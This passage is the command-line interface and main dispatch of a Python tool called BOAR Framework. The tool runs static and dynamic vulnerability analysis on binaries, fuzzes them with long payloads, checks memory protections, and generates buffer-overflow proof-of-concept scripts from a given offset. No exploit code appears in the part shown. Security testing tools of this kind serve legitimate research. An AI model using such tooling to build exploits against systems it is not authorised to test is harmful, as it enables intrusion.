    parser_static.add_argument("--severity", "-s", choices=['all', 'critical', 'high', 'medium'], 
                              default='all', help="Filter by severity level")

    # Dynamic analysis command
    parser_dynamic = subparsers.add_parser("dynamic", help="Advanced dynamic analysis")
    parser_dynamic.add_argument("binary", help="Binary file to analyze")
    parser_dynamic.add_argument("-l", "--length", type=int, default=1000, 
                               help="Payload length (default: 1000)")
    parser_dynamic.add_argument("-m", "--method", choices=['stdin', 'argv'], default='stdin',
                               help="Input method (default: stdin)")
    parser_dynamic.add_argument("-d", "--debug", action="store_true", 
                               help="Enable debug mode")
    parser_dynamic.add_argument("--check-protections", action="store_true",
                               help="Check binary security protections")

    # PoC generation command
    parser_poc = subparsers.add_parser("poc", help="Generate advanced PoC scripts")
    parser_poc.add_argument("binary", help="Target binary")
    parser_poc.add_argument("-o", "--offset", type=int, required=True, 
                           help="Buffer overflow offset")
    parser_poc.add_argument("--arch", choices=[32, 64], type=int, default=32,
                           help="Target architecture (default: 32)")
    parser_poc.add_argument("--advanced", action="store_true",
                           help="Generate advanced exploitation templates")

    # Info command
    parser_info = subparsers.add_parser("info", help="Show tool information and statistics")

    args = parser.parse_args()

    # Print epic dragon banner
    print_dragon_banner()

    try:
        if args.command == "static":
            run_static_analysis(args.target)
            
        elif args.command == "dynamic":
            if args.check_protections:
                protections = check_binary_protections(args.binary)
                print(f"Binary protections: {protections}")
            run_dynamic_analysis(args.binary, args.length, args.debug, args.method)
            
        elif args.command == "poc":
            if args.advanced:
                protections = check_binary_protections(args.binary)
                generate_advanced_poc_script(args.binary, args.offset, args.arch, protections)
            else:
                generate_poc_script(args.binary, args.offset)
                
        elif args.command == "info":
            print("🔥 BOAR Framework Information:")
            print(f"- CVE Patterns: {len(CVE_PATTERNS)}")
            print(f"- Complex Patterns: {len(COMPLEX_VULNERABILITY_PATTERNS)}")
            print("- Supported Architectures: 32-bit, 64-bit")
            print("- Supported Input Methods: stdin, argv")
            print("- Protection Detection: Canary, NX, PIE, RELRO, ASLR")
            print("- Output Formats: JSON, HTML, Text")
            
        else:
            parser.print_help()
            
    except KeyboardInterrupt:
        print("\n[*] Operation cancelled by user")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()